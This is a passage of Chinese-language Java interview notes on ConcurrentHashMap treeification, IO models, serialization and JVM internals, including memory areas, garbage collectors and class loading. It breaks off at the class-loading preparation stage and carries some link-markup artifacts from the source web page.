当某个槽内的元素个数达到 7 且 table 容量不小于 64 时，[链表]()转为[红黑树]()。当某个槽内的元素减少到 6 时，由[红黑树]()重新转为[链表]()。在转化过程中，使用同步块锁住当前槽的首元素，防止其他线程对当前槽进行增删改操作，转化完成后利用 CAS 替换原有[链表]()。由于 TreeNode 节点也存储了 next 引用，因此[红黑树]()转为[链表]()很简单，只需从 first 元素开始遍历所有节点，并把节点从 TreeNode 转为 Node 类型即可，当构造好新[链表]()后同样用 CAS 替换[红黑树]()。

## IO流

### 同步/异步/阻塞/非阻塞 IO 的区别？

同步和异步是通信机制，阻塞和非阻塞是调用状态。

同步 IO 是用户线程发起 IO 请求后需要等待或轮询内核 IO 操作完成后才能继续执行。异步 IO 是用户线程发起 IO 请求后可以继续执行，当内核 IO 操作完成后会通知用户线程，或调用用户线程注册的回调函数。

阻塞 IO 是 IO 操作需要彻底完成后才能返回用户空间 。非阻塞 IO 是 IO 操作调用后立即返回一个状态值，无需等 IO 操作彻底完成。

### 什么是 BIO？

**BIO** 是同步阻塞式 IO，JDK1.4 之前的 IO 模型。服务器实现模式为一个连接请求对应一个线程，服务器需要为每一个客户端请求创建一个线程，如果这个连接不做任何事会造成不必要的线程开销。可以通过线程池改善，这种 IO 称为伪异步 IO。适用连接数目少且服务器资源多的场景。

### 什么是 NIO？

**NIO** 是 JDK1.4 引入的同步非阻塞 IO。服务器实现模式为多个连接请求对应一个线程，客户端连接请求会注册到一个多路复用器 Selector ，Selector 轮询到连接有 IO 请求时才启动一个线程处理。适用连接数目多且连接时间短的场景。

同步是指线程还是要不断接收客户端连接并处理数据，非阻塞是指如果一个管道没有数据，不需要等待，可以轮询下一个管道。

核心组件：

- **Selector：** 多路复用器，轮询检查多个 Channel 的状态，判断注册事件是否发生，即判断 Channel 是否处于可读或可写状态。使用前需要将 Channel 注册到 Selector，注册后会得到一个 SelectionKey，通过 SelectionKey 获取 Channel 和 Selector 相关信息。

- **Channel：** 双向通道，替换了 BIO 中的 Stream 流，不能直接访问数据，要通过 Buffer 来读写数据，也可以和其他 Channel 交互。

- **Buffer：** 缓冲区，本质是一块可读写数据的内存，用来简化数据读写。Buffer 三个重要属性：position 下次读写数据的位置，limit 本次读写的极限位置，capacity 最大容量。

  - `flip` 将写转为读，底层实现原理把 position 置 0，并把 limit 设为当前的 position 值。 
  - `clear` 将读转为写模式（用于读完全部数据的情况，把 position 置 0，limit 设为 capacity）。 
  - `compact` 将读转为写模式（用于存在未读数据的情况，让 position 指向未读数据的下一个）。 
  - 通道方向和 Buffer 方向相反，读数据相当于向 Buffer 写，写数据相当于从 Buffer 读。 

  使用步骤：向 Buffer 写数据，调用 flip 方法转为读模式，从 Buffer 中读数据，调用 clear 或 compact 方法清空缓冲区。

### 什么是 AIO？

AIO 是 JDK7 引入的异步非阻塞 IO。服务器实现模式为一个有效请求对应一个线程，客户端的 IO 请求都是由操作系统先完成 IO 操作后再通知服务器应用来直接使用准备好的数据。适用连接数目多且连接时间长的场景。

异步是指服务端线程接收到客户端管道后就交给底层处理IO通信，自己可以做其他事情，非阻塞是指客户端有数据才会处理，处理好再通知服务器。

实现方式包括通过 Future 的 `get` 方法进行阻塞式调用以及实现 CompletionHandler 接口，重写请求成功的回调方法 `completed` 和请求失败回调方法 `failed`。

### java.io 包下有哪些流？

主要分为字符流和字节流，字符流一般用于文本文件，字节流一般用于图像或其他文件。

字符流包括了字符输入流 Reader 和字符输出流 Writer，字节流包括了字节输入流 InputStream 和字节输出流 OutputStream。字符流和字节流都有对应的缓冲流，字节流也可以包装为字符流，缓冲流带有一个 8KB 的缓冲数组，可以提高流的读写效率。除了缓冲流外还有过滤流 FilterReader、字符数组流 CharArrayReader、字节数组流 ByteArrayInputStream、文件流 FileInputStream 等。

### 序列化和反序列化是什么？

Java 对象 JVM 退出时会全部销毁，如果需要将对象及状态持久化，就要通过序列化实现，将内存中的对象保存在二进制流中，需要时再将二进制流反序列化为对象。对象序列化保存的是对象的状态，因此属于类属性的静态变量不会被序列化。

常见的序列化有三种：

- **Java 原生序列化**

  实现 `Serializabale` 标记接口，Java 序列化保留了对象类的元数据（如类、成员变量、继承类信息）以及对象数据，兼容性最好，但不支持跨语言，性能一般。序列化和反序列化必须保持序列化 ID 的一致，一般使用 `private static final long serialVersionUID` 定义序列化 ID，如果不设置编译器会根据类的内部实现自动生成该值。如果是兼容升级不应该修改序列化 ID，防止出错，如果是不兼容升级则需要修改。

- **Hessian 序列化**

  Hessian 序列化是一种支持动态类型、跨语言、基于对象传输的网络协议。Java 对象序列化的二进制流可以被其它语言反序列化。Hessian 协议的特性：① 自描述序列化类型，不依赖外部描述文件，用一个字节表示常用基础类型，极大缩短二进制流。② 语言无关，支持脚本语言。③ 协议简单，比 Java 原生序列化高效。Hessian 会把复杂对象所有属性存储在一个 Map 中序列化，当父类和子类存在同名成员变量时会先序列化子类再序列化父类，因此子类值会被父类覆盖。

- **JSON 序列化**

  JSON 序列化就是将数据对象转换为 JSON 字符串，在序列化过程中抛弃了类型信息，所以反序列化时只有提供类型信息才能准确进行。相比前两种方式可读性更好，方便调试。

序列化通常会使用网络传输对象，而对象中往往有敏感数据，容易遭受攻击，Jackson 和 fastjson 等都出现过反序列化漏洞，因此不需要进行序列化的敏感属性传输时应加上 transient 关键字。transient 的作用就是把变量生命周期仅限于内存而不会写到磁盘里持久化，变量会被设为对应数据类型的零值。

## JVM

### 运行时数据区是什么？

虚拟机在执行 Java 程序的过程中会把它所管理的内存划分为若干不同的数据区，这些区域有各自的用途、创建和销毁时间。

线程私有：程序计数器、Java 虚拟机栈、本地方法栈。

线程共享：Java 堆、方法区。

### 程序计数器是什么？

**程序计数器**是一块较小的内存空间，可以看作当前线程所执行字节码的行号指示器。字节码解释器工作时通过改变计数器的值选取下一条执行指令。分支、循环、跳转、线程恢复等功能都需要依赖计数器完成。是唯一在虚拟机规范中没有规定内存溢出情况的区域。

如果线程正在执行 Java 方法，计数器记录正在执行的虚拟机字节码指令地址。如果是本地方法，计数器值为 Undefined。

### Java 虚拟机栈的作用？

**Java 虚拟机栈**来描述 Java 方法的内存模型。每当有新线程创建时就会分配一个栈空间，线程结束后栈空间被回收，栈与线程拥有相同的生命周期。栈中元素用于支持虚拟机进行方法调用，每个方法在执行时都会创建一个栈帧存储方法的局部变量表、操作栈、动态链接和方法出口等信息。每个方法从调用到执行完成，就是栈帧从入栈到出栈的过程。

有两类异常：① 线程请求的栈深度大于虚拟机允许的深度抛出 StackOverflowError。② 如果 JVM 栈容量可以动态扩展，栈扩展无法申请足够内存抛出 OutOfMemoryError（HotSpot 不可动态扩展，不存在此问题）。

### 本地方法栈的作用？

**本地方法栈**与虚拟机栈作用相似，不同的是虚拟机栈为虚拟机执行 Java 方法服务，本地方法栈为虚本地方法服务。调用本地方法时虚拟机栈保持不变，动态链接并直接调用指定本地方法。

虚拟机规范对本地方法栈中方法的语言与数据结构无强制规定，虚拟机可自由实现，例如 HotSpot 将虚拟机栈和本地方法栈合二为一。

本地方法栈在栈深度异常和栈扩展失败时分别抛出 StackOverflowError 和 OutOfMemoryError。

### 堆的作用是什么？

**堆**是虚拟机所管理的内存中最大的一块，被所有线程共享的，在虚拟机启动时创建。堆用来存放对象实例，Java 里几乎所有对象实例都在堆分配内存。堆可以处于物理上不连续的内存空间，逻辑上应该连续，但对于例如数组这样的大对象，多数虚拟机实现出于简单、存储高效的考虑会要求连续的内存空间。

堆既可以被实现成固定大小，也可以是可扩展的，可通过 `-Xms` 和 `-Xmx` 设置堆的最小和最大容量，当前主流 JVM 都按照可扩展实现。如果堆没有内存完成实例分配也无法扩展，抛出 OutOfMemoryError。

### 方法区的作用是什么？

**方法区**用于存储被虚拟机加载的类型信息、常量、静态变量、即时编译器编译后的代码缓存等数据。

JDK8 之前使用永久代实现方法区，容易内存溢出，因为永久代有 `-XX:MaxPermSize` 上限，即使不设置也有默认大小。JDK7 把放在永久代的字符串常量池、静态变量等移出，JDK8 中永久代完全废弃，改用在本地内存中实现的元空间代替，把 JDK 7 中永久代剩余内容（主要是类型信息）全部移到元空间。

虚拟机规范对方法区的约束宽松，除和堆一样不需要连续内存和可选择固定大小/可扩展外，还可以不实现垃圾回收。垃圾回收在方法区出现较少，主要目标针对常量池和类型卸载。如果方法区无法满足新的内存分配需求，将抛出 OutOfMemoryError。

### 运行时常量池的作用是什么?

运行时常量池是方法区的一部分，Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池表，用于存放编译器生成的各种字面量与符号引用，这部分内容在类加载后存放到运行时常量池。一般除了保存 Class 文件中描述的符号引用外，还会把符号引用翻译的直接引用也存储在运行时常量池。

运行时常量池相对于 Class 文件常量池的一个重要特征是动态性，Java 不要求常量只有编译期才能产生，运行期间也可以将新的常量放入池中，这种特性利用较多的是 String 的 `intern` 方法。

运行时常量池是方法区的一部分，受到方法区内存的限制，当常量池无法再申请到内存时会抛出 OutOfMemoryError。

### 直接内存是什么？

直接内存不属于运行时数据区，也不是虚拟机规范定义的内存区域，但这部分内存被频繁使用，而且可能导致内存溢出。

JDK1.4 中新加入了 NIO 这种基于通道与缓冲区的 IO，它可以使用 Native 函数库直接分配堆外内存，通过一个堆里的 DirectByteBuffer 对象作为内存的引用进行操作，避免了在 Java 堆和 Native堆来回复制数据。

直接内存的分配不受 Java 堆大小的限制，但还是会受到本机总内存及处理器寻址空间限制，一般配置虚拟机参数时会根据实际内存设置 `-Xmx` 等参数信息，但经常忽略直接内存，使内存区域总和大于物理内存限制，导致动态扩展时出现 OOM。

由直接内存导致的内存溢出，一个明显的特征是在 Heap Dump 文件中不会看见明显的异常，如果发现内存溢出后产生的 Dump 文件很小，而程序中又直接或间接使用了直接内存（典型的间接使用就是 NIO），那么就可以考虑检查直接内存方面的原因。

### 内存溢出和内存泄漏的区别？

内存溢出 OutOfMemory，指程序在申请内存时，没有足够的内存空间供其使用。

内存泄露 Memory Leak，指程序在申请内存后，无法释放已申请的内存空间，内存泄漏最终将导致内存溢出。

### 堆溢出的原因？

堆用于存储对象实例，只要不断创建对象并保证 GC Roots 到对象有可达路径避免垃圾回收，随着对象数量的增加，总容量触及最大堆容量后就会 OOM，例如在 while 死循环中一直 new 创建实例。

堆 OOM 是实际应用中最常见的 OOM，处理方法是通过内存映像分析工具对 Dump 出的堆转储快照分析，确认内存中导致 OOM 的对象是否必要，分清到底是内存泄漏还是内存溢出。

如果是内存泄漏，通过工具查看泄漏对象到 GC Roots 的引用链，找到泄露对象是通过怎样的引用路径、与哪些 GC Roots 关联才导致无法回收，一般可以准确定位到产生内存泄漏代码的具***置。

如果不是内存泄漏，即内存中对象都必须存活，应当检查 JVM 堆参数，与机器内存相比是否还有向上调整的空间。再从代码检查是否存在某些对象生命周期过长、持有状态时间过长、存储结构设计不合理等情况，尽量减少程序运行期的内存消耗。

### 栈溢出的原因？

由于 HotSpot 不区分虚拟机和本地方法栈，设置本地方法栈大小的参数没有意义，栈容量只能由 `-Xss` 参数来设定，存在两种异常：

**StackOverflowError：** 如果线程请求的栈深度大于虚拟机所允许的深度，将抛出 StackOverflowError，例如一个递归方法不断调用自己。该异常有明确错误堆栈可供分析，容易定位到问题所在。

**OutOfMemoryError：** 如果 JVM 栈可以动态扩展，当扩展无法申请到足够内存时会抛出 OutOfMemoryError。HotSpot 不支持虚拟机栈扩展，所以除非在创建线程申请内存时就因无法获得足够内存而出现 OOM，否则在线程运行时是不会因为扩展而导致溢出的。

### 运行时常量池溢出的原因？

String 的 `intern` 方法是一个本地方法，作用是如果字符串常量池中已包含一个等于此 String 对象的字符串，则返回池中这个字符串的 String 对象的引用，否则将此 String 对象包含的字符串添加到常量池并返回此 String 对象的引用。

在 JDK6 及之前常量池分配在永久代，因此可以通过 `-XX:PermSize` 和 `-XX:MaxPermSize` 限制永久代大小，间接限制常量池。在 while 死循环中调用 `intern` 方法导致运行时常量池溢出。在 JDK7 后不会出现该问题，因为存放在永久代的字符串常量池已经被移至堆中。

### 方法区溢出的原因？

方法区主要存放类型信息，如类名、访问修饰符、常量池、字段描述、方法描述等。只要不断在运行时产生大量类，方法区就会溢出。例如使用 JDK 反射或 CGLib 直接操作字节码在运行时生成大量的类。很多框架如 Spring、Hibernate 等对类增强时都会使用 CGLib 这类字节码技术，增强的类越多就需要越大的方法区保证动态生成的新类型可以载入内存，也就更容易导致方法区溢出。

JDK8 使用元空间取代永久代，HotSpot 提供了一些参数作为元空间防御措施，例如 `-XX:MetaspaceSize` 指定元空间初始大小，达到该值会触发 GC 进行类型卸载，同时收集器会对该值进行调整，如果释放大量空间就适当降低该值，如果释放很少空间就适当提高。

### 创建对象的过程

**字节码角度**

- **NEW：** 如果找不到 Class 对象则进行类加载。加载成功后在堆中分配内存，从 Object 到本类路径上的所有属性都要分配。分配完毕后进行零值设置。最后将指向实例对象的引用变量压入虚拟机栈顶。 
- **DUP： ** 在栈顶复制引用变量，这时栈顶有两个指向堆内实例的引用变量。两个引用变量的目的不同，栈底的引用用于赋值或保存局部变量表，栈顶的引用作为句柄调用相关方法。 
- **INVOKESPECIAL：** 通过栈顶的引用变量调用 init 方法。 

**执行角度**

① 当 JVM 遇到字节码 new 指令时，首先将检查该指令的参数能否在常量池中定位到一个类的符号引用，并检查引用代表的类是否已被加载、解析和初始化，如果没有就先执行类加载。

② 在类加载检查通过后虚拟机将为新生对象分配内存。

③ 内存分配完成后虚拟机将成员变量设为零值，保证对象的实例字段可以不赋初值就使用。

④ 设置对象头，包括哈希码、GC 信息、锁信息、对象所属类的类元信息等。

⑤ 执行 init 方法，初始化成员变量，执行实例化代码块，调用类的构造方法，并把堆内对象的首地址赋值给引用变量。

### 对象分配内存的方式有哪些？

对象所需内存大小在类加载完成后便可完全确定，分配空间的任务实际上等于把一块确定大小的内存块从 Java 堆中划分出来。

**指针碰撞：** 假设 Java 堆内存规整，被使用过的内存放在一边，空闲的放在另一边，中间放着一个指针作为分界指示器，分配内存就是把指针向空闲方向挪动一段与对象大小相等的距离。

**空闲列表：** 如果 Java 堆内存不规整，虚拟机必须维护一个列表记录哪些内存可用，在分配时从列表中找到一块足够大的空间划分给对象并更新列表记录。

选择哪种分配方式由堆是否规整决定，堆是否规整由垃圾收集器是否有空间压缩能力决定。使用 Serial、ParNew 等收集器时，系统采用指针碰撞；使用 CMS 这种基于清除[算法]()的垃圾收集器时，采用空间列表。

### 对象分配内存是否线程安全？

对象创建十分频繁，即使修改一个指针的位置在并发下也不是线程安全的，可能正给对象 A 分配内存，指针还没来得及修改，对象 B 又使用了指针来分配内存。

解决方法：① CAS 加失败重试保证更新原子性。② 把内存分配按线程划分在不同空间，即每个线程在 Java 堆中预先分配一小块内存，叫做本地线程分配缓冲 TLAB，哪个线程要分配内存就在对应的 TLAB 分配，TLAB 用完了再进行同步。

### 对象的内存布局了解吗？

对象在堆内存的存储布局可分为对象头、实例数据和对齐填充。

**对象头**占 12B，包括对象标记和类型指针。对象标记存储对象自身的运行时数据，如哈希码、GC 分代年龄、锁标志、偏向线程 ID 等，这部分占 8B，称为 Mark Word。Mark Word 被设计为动态数据结构，以便在极小的空间存储更多数据，根据对象状态复用存储空间。

类型指针是对象指向它的类型元数据的指针，占 4B。JVM 通过该指针来确定对象是哪个类的实例。

**实例数据**是对象真正存储的有效信息，即本类对象的实例成员变量和所有可见的父类成员变量。存储顺序会受到虚拟机分配策略参数和字段在源码中定义顺序的影响。相同宽度的字段总是被分配到一起存放，在满足该前提条件的情况下父类中定义的变量会出现在子类之前。

**对齐填充**不是必然存在的，仅起占位符作用。虚拟机的自动内存管理系统要求任何对象的大小必须是 8B 的倍数，对象头已被设为 8B 的 1 或 2 倍，如果对象实例数据部分没有对齐，需要对齐填充补全。

### 对象的访问方式有哪些?

Java 程序会通过栈上的 reference 引用操作堆对象，访问方式由虚拟机决定，主流访问方式主要有句柄和直接指针。

**句柄：** 堆会划分出一块内存作为句柄池，reference 中存储对象的句柄地址，句柄包含对象实例数据与类型数据的地址信息。优点是 reference 中存储的是稳定句柄地址，在 GC 过程中对象被移动时只会改变句柄的实例数据指针，而 reference 本身不需要修改。

**直接指针：** 堆中对象的内存布局就必须考虑如何放置访问类型数据的相关信息，reference 存储对象地址，如果只是访问对象本身就不需要多一次间接访问的开销。优点是速度更快，节省了一次指针定位的时间开销，HotSpot 主要使用直接指针进行对象访问。

### 如何判断对象是否是垃圾？

**引用计数：**在对象中添加一个引用计数器，如果被引用计数器加 1，引用失效时计数器减 1，如果计数器为 0 则被标记为垃圾。原理简单，效率高，但是在 Java 中很少使用，因为存在对象间循环引用的问题，导致计数器无法清零。

**可达性分析：**主流语言的内存管理都使用可达性分析判断对象是否存活。基本思路是通过一系列称为 GC Roots 的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程走过的路径称为引用链，如果某个对象到 GC Roots 没有任何引用链相连，则会被标记为垃圾。可作为 GC Roots 的对象包括虚拟机栈和本地方法栈中引用的对象、类静态属性引用的对象、常量引用的对象。

### Java 的引用有哪些类型？

JDK1.2 后对引用进行了扩充，按强度分为四种：

**强引用：** 最常见的引用，例如 `Object obj = new Object()` 就属于强引用。只要对象有强引用指向且 GC Roots 可达，在内存回收时即使濒临内存耗尽也不会被回收。

**软引用：** 弱于强引用，描述非必需对象。在系统将发生内存溢出前，会把软引用关联的对象加入回收范围以获得更多内存空间。用来缓存服务器中间计算结果及不需要实时保存的用户行为等。

**弱引用：** 弱于软引用，描述非必需对象。弱引用关联的对象只能生存到下次 YGC 前，当垃圾收集器开始工作时无论当前内存是否足够都会回收只被弱引用关联的对象。由于 YGC 具有不确定性，因此弱引用何时被回收也不确定。

**虚引用：** 最弱的引用，定义完成后无法通过该引用获取对象。唯一目的就是为了能在对象被回收时收到一个系统通知。虚引用必须与引用队列联合使用，垃圾回收时如果出现虚引用，就会在回收对象前把这个虚引用加入引用队列。

### 有哪些 GC [算法](https://www.nowcoder.com/jump/super-jump/word?word=算法)？

**标记-清除[算法]()**

分为标记和清除阶段，首先从每个 GC Roots 出发依次标记有引用关系的对象，最后清除没有标记的对象。

执行效率不稳定，如果堆包含大量对象且大部分需要回收，必须进行大量标记清除，导致效率随对象数量增长而降低。

存在内存空间碎片化问题，会产生大量不连续的内存碎片，导致以后需要分配大对象时容易触发 Full GC。

**标记-复制[算法]()**

为了解决内存碎片问题，将可用内存按容量划分为大小相等的两块，每次只使用其中一块。当使用的这块空间用完了，就将存活对象复制到另一块，再把已使用过的内存空间一次清理掉。主要用于进行新生代。

实现简单、运行高效，解决了内存碎片问题。 代价是可用内存缩小为原来的一半，浪费空间。

HotSpot 把新生代划分为一块较大的 Eden 和两块较小的 Sur[vivo]()r，每次分配内存只使用 Eden 和其中一块 Sur[vivo]()r。垃圾收集时将 Eden 和 Sur[vivo]()r 中仍然存活的对象一次性复制到另一块 Sur[vivo]()r 上，然后直接清理掉 Eden 和已用过的那块 Sur[vivo]()r。HotSpot 默认Eden 和 Sur[vivo]()r 的大小比例是 8:1，即每次新生代中可用空间为整个新生代的 90%。

**标记-整理[算法]()**

标记-复制[算法]()在对象存活率高时要进行较多复制操作，效率低。如果不想浪费空间，就需要有额外空间分配担保，应对被使用内存中所有对象都存活的极端情况，所以老年代一般不使用此[算法]()。

老年代使用标记-整理[算法]()，标记过程与标记-清除[算法]()一样，但不直接清理可回收对象，而是让所有存活对象都向内存空间一端移动，然后清理掉边界以外的内存。

标记-清除与标记-整理的差异在于前者是一种非移动式[算法]()而后者是移动式的。如果移动存活对象，尤其是在老年代这种每次回收都有大量对象存活的区域，是一种极为负重的操作，而且移动必须全程暂停用户线程。如果不移动对象就会导致空间碎片问题，只能依赖更复杂的内存分配器和访问器解决。

### 你知道哪些垃圾收集器？

**Serial**

最基础的收集器，使用复制[算法]()、单线程工作，只用一个处理器或一条线程完成垃圾收集，进行垃圾收集时必须暂停其他所有工作线程。

Serial 是虚拟机在客户端模式的默认新生代收集器，简单高效，对于内存受限的环境它是所有收集器中额外内存消耗最小的，对于处理器核心较少的环境，Serial 由于没有线程交互开销，可获得最高的单线程收集效率。

**ParNew**

Serial 的多线程版本，除了使用多线程进行垃圾收集外其余行为完全一致。

ParNew 是虚拟机在服务端模式的默认新生代收集器，一个重要原因是除了 Serial 外只有它能与 CMS 配合。自从 JDK 9 开始，ParNew 加 CMS 不再是官方推荐的解决方案，官方希望它被 G1 取代。

**Parallel Scavenge**

新生代收集器，基于复制[算法]()，是可并行的多线程收集器，与 ParNew 类似。

特点是它的关注点与其他收集器不同，Parallel Scavenge 的目标是达到一个可控制的吞吐量，吞吐量就是处理器用于运行用户代码的时间与处理器消耗总时间的比值。

**Serial Old**

Serial 的老年代版本，单线程工作，使用标记-整理[算法]()。

Serial Old 是虚拟机在客户端模式的默认老年代收集器，用于服务端有两种用途：① JDK5 及之前与 Parallel Scavenge 搭配。② 作为CMS 失败预案。

**Parellel Old**

Parallel Scavenge 的老年代版本，支持多线程，基于标记-整理[算法]()。JDK6 提供，注重吞吐量可考虑 Parallel Scavenge 加 Parallel Old。

**CMS**

以获取最短回收停顿时间为目标，基于标记-清除[算法]()，过程相对复杂，分为四个步骤：初始标记、并发标记、重新标记、并发清除。

初始标记和重新标记需要 STW（Stop The World，系统停顿），初始标记仅是标记 GC Roots 能直接关联的对象，速度很快。并发标记从 GC Roots 的直接关联对象开始遍历整个对象图，耗时较长但不需要停顿用户线程。重新标记则是为了修正并发标记期间因用户程序运作而导致标记产生变动的那部分记录。并发清除清理标记阶段判断的已死亡对象，不需要移动存活对象，该阶段也可与用户线程并发。

缺点：① 对处理器资源敏感，并发阶段虽然不会导致用户线程暂停，但会降低吞吐量。② 无法处理浮动垃圾，有可能出现并发失败而导致 Full GC。③ 基于标记-清除[算法]()，产生空间碎片。

**G1**

开创了收集器面向局部收集的设计思路和基于 Region 的内存布局，主要面向服务端，最初设计目标是替换 CMS。

G1 之前的收集器，垃圾收集目标要么是整个新生代，要么是整个老年代或整个堆。而 G1 可面向堆任何部分来组成回收集进行回收，衡量标准不再是分代，而是哪块内存中存放的垃圾数量最多，回收受益最大。

跟踪各 Region 里垃圾的价值，价值即回收所获空间大小以及回收所需时间的经验值，在后台维护一个优先级列表，每次根据用户设定允许的收集停顿时间优先处理回收价值最大的 Region。这种方式保证了 G1 在有限时间内获取尽可能高的收集效率。

G1 运作过程：

- **初始标记：**标记 GC Roots 能直接关联到的对象，让下一阶段用户线程并发运行时能正确地在可用 Region 中分配新对象。需要 STW 但耗时很短，在 Minor GC 时同步完成。 
- **并发标记：**从 GC Roots 开始对堆中对象进行可达性分析，递归扫描整个堆的对象图。耗时长但可与用户线程并发，扫描完成后要重新处理 SATB 记录的在并发时有变动的对象。 
- **最终标记：**对用户线程做短暂暂停，处理并发阶段结束后仍遗留下来的少量 SATB 记录。 
- **筛选回收：**对各 Region 的回收价值[排序]()，根据用户期望停顿时间制定回收计划。必须暂停用户线程，由多条收集线程并行完成。 

可由用户指定期望停顿时间是 G1 的一个强大功能，但该值不能设得太低，一般设置为100~300 ms。

### ZGC 了解吗？

JDK11 中加入的具有实验性质的低延迟垃圾收集器，目标是尽可能在不影响吞吐量的前提下，实现在任意堆内存大小都可以把停顿时间限制在 10ms 以内的低延迟。

基于 Region 内存布局，不设分代，使用了读屏障、染色指针和内存多重映射等技术实现可并发的标记-整理，以低延迟为首要目标。

ZGC 的 Region 具有动态性，是动态创建和销毁的，并且容量大小也是动态变化的。

### 你知道哪些内存分配与回收策略？

**对象优先在 Eden 区分配**

大多数情况下对象在新生代 Eden 区分配，当 Eden 没有足够空间时将发起一次 Minor GC。

**大对象直接进入老年代**

大对象指需要大量连续内存空间的对象，典型是很长的字符串或数量庞大的数组。大对象容易导致内存还有不少空间就提前触发垃圾收集以获得足够的连续空间。

HotSpot 提供了 `-XX:PretenureSizeThreshold` 参数，大于该值的对象直接在老年代分配，避免在 Eden 和 Sur[vivo]()r 间来回复制。

**长期存活对象进入老年代**

虚拟机给每个对象定义了一个对象年龄计数器，存储在对象头。如果经历过第一次 Minor GC 仍然存活且能被 Sur[vivo]()r 容纳，该对象就会被移动到 Sur[vivo]()r 中并将年龄设置为 1。对象在 Sur[vivo]()r 中每熬过一次 Minor GC 年龄就加 1 ，当增加到一定程度（默认15）就会被晋升到老年代。对象晋升老年代的阈值可通过 `-XX:MaxTenuringThreshold` 设置。

**动态对象年龄判定**

为了适应不同内存状况，虚拟机不要求对象年龄达到阈值才能晋升老年代，如果在 Sur[vivo]()r 中相同年龄所有对象大小的总和大于 Sur[vivo]()r 的一半，年龄不小于该年龄的对象就可以直接进入老年代。

**空间分配担保**

MinorGC 前虚拟机必须检查老年代最大可用连续空间是否大于新生代对象总空间，如果满足则说明这次 Minor GC 确定安全。

如果不满足，虚拟机会查看 `-XX:HandlePromotionFailure` 参数是否允许担保失败，如果允许会继续检查老年代最大可用连续空间是否大于历次晋升老年代对象的平均大小，如果满足将冒险尝试一次 Minor GC，否则改成一次 FullGC。

冒险是因为新生代使用复制[算法]()，为了内存利用率只使用一个 Sur[vivo]()r，大量对象在 Minor GC 后仍然存活时，需要老年代进行分配担保，接收 Sur[vivo]()r 无法容纳的对象。

### 你知道哪些故障处理工具？

**jps：虚拟机进程状况工具**

功能和 ps 命令类似：可以列出正在运行的虚拟机进程，显示虚拟机执行主类名称以及这些进程的本地虚拟机唯一 ID（LVMID)。LVMID 与操作系统的进程 ID（PID）一致，使用 Windows 的任务管理器或 UNIX 的 ps 命令也可以查询到虚拟机进程的 LVMID，但如果同时启动了多个虚拟机进程，必须依赖 jps 命令。

**jstat：虚拟机统计信息监视工具**

用于监视虚拟机各种运行状态信息。可以显示本地或远程虚拟机进程中的类加载、内存、垃圾收集、即时编译器等运行时数据，在没有 GUI 界面的服务器上是运行期定位虚拟机性能问题的常用工具。

参数含义：S0 和 S1 表示两个 Sur[vivo]()r，E 表示新生代，O 表示老年代，YGC 表示 Young GC 次数，YGCT 表示 Young GC 耗时，FGC 表示 Full GC 次数，FGCT 表示 Full GC 耗时，GCT 表示 GC 总耗时。

**jinfo：Java 配置信息工具**

实时查看和调整虚拟机各项参数，使用 jps 的 -v 参数可以查看虚拟机启动时显式指定的参数，但如果想知道未显式指定的参数值只能使用 jinfo 的 -flag 查询。

**jmap：Java 内存映像工具**

用于生成堆转储快照，还可以查询 finalize 执行队列、Java 堆和方法区的详细信息，如空间使用率，当前使用的是哪种收集器等。和 jinfo 一样，部分功能在 Windows 受限，除了生成堆转储快照的 -dump 和查看每个类实例的 -histo 外，其余选项只能在 Linux 使用。

**jhat：虚拟机堆转储快照分析工具**

JDK 提供 jhat 与 jmap 搭配使用分析 jmap 生成的堆转储快照。jhat 内置了一个微型的 HTTP/Web 服务器，生成堆转储快照的分析结果后可以在浏览器查看。

**jstack：Java 堆栈跟踪工具**

用于生成虚拟机当前时刻的线程快照。线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的目的通常是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间挂起等。线程出现停顿时通过 jstack 查看各个线程的调用堆栈，可以获知没有响应的线程在后台做什么或等什么资源。

### Java 程序是怎样运行的

首先通过 Javac 编译器将 `.java` 转为 JVM 可加载的 `.class` 字节码文件。

Javac 是由 Java 编写的程序，编译过程可以分为： ① 词法解析，通过空格分割出单词、操作符、控制符等信息，形成 token 信息流，传递给语法解析器。② 语法解析，把 token 信息流按照 Java 语法规则组装成语法树。③ 语义分析，检查关键字使用是否合理、类型是否匹配、作用域是否正确等。④ 字节码生成，将前面各个步骤的信息转换为字节码。

字节码必须通过类加载过程加载到 JVM 后才可以执行，执行有三种模式，解释执行、JIT 编译执行、JIT 编译与解释器混合执行（主流 JVM 默认执行的方式）。混合模式的优势在于解释器在启动时先解释执行，省去编译时间。

之后通过即时编译器 JIT 把字节码文件编译成本地机器码。

Java 程序最初都是通过解释器进行解释执行的，当虚拟机发现某个方法或代码块的运行特别频繁，就会认定其为"热点代码"，热点代码的检测主要有基于采样和基于计数器两种方式，为了提高热点代码的执行效率，虚拟机会把它们编译成本地机器码，尽可能对代码优化，在运行时完成这个任务的后端编译器被称为即时编译器。

还可以通过静态的提前编译器 AOT 直接把程序编译成与目标机器指令集相关的二进制代码。

### 类加载是什么？

Class 文件中描述的各类信息都需要加载到虚拟机后才能使用。JVM 把描述类的数据从 Class 文件加载到内存，并对数据进行校验、解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这个过程称为虚拟机的类加载机制。

与编译时需要连接的语言不同，Java 中类型的加载、连接和初始化都是在运行期间完成的，这增加了性能开销，但却提供了极高的扩展性，Java 动态扩展的语言特性就是依赖运行期动态加载和连接实现的。

一个类型从被加载到虚拟机内存开始，到卸载出内存为止，整个生命周期经历加载、验证、准备、解析、初始化、使用和卸载七个阶段，其中验证、解析和初始化三个部分称为连接。加载、验证、准备、初始化阶段的顺序是确定的，解析则不一定：可能在初始化之后再开始，这是为了支持 Java 的动态绑定。

### 类加载的过程是什么?

**加载**

该阶段虚拟机需要完成三件事：① 通过一个类的全限定类名获取定义类的二进制字节流。② 将字节流所代表的静态存储结构转化为方法区的运行时数据区。③ 在内存中生成对应该类的 Class 实例，作为方法区这个类的数据访问入口。

**验证**

确保 Class 文件的字节流符合约束。如果虚拟机不检查输入的字节流，可能因为载入有错误或恶意企图的字节流而导致系统受攻击。验证主要包含四个阶段：文件格式验证、元数据验证、字节码验证、符号引用验证。

验证重要但非必需，因为只有通过与否的区别，通过后对程序运行期没有任何影响。如果代码已被反复使用和验证过，在生产环境就可以考虑关闭大部分验证缩短类加载时间。

**准备**

